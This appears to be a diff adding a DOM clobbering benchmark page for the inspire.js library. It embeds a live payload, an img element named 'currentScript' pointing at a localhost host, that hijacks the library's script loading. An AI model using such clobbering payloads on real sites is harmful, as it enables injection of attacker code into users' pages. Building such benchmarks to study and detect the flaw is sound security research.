@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DOM Clobbering Micro Benchmarks</title>
+    <link rel="stylesheet" href="../styles/styles.css">
+</head>
+<body>
+<h1>DOM Clobbering Collection - inspire</h1>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Payload</span><br><br>
+  <pre>&lt;img name=currentScript src=&quot;http://localhost:9999&quot;&gt;&lt;/img&gt;</pre>
+  <img name=currentScript src="http://localhost:9999"></img>
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Library</span><br><br>
+  <pre>&lt;script src=&quot;https://inspirejs.org/inspire.js&quot;&gt;&lt;/script&gt;</pre>
+  <script src="https://inspirejs.org/inspire.js"></script>
+  </div>
+</section>
+
+</body>
+</html>
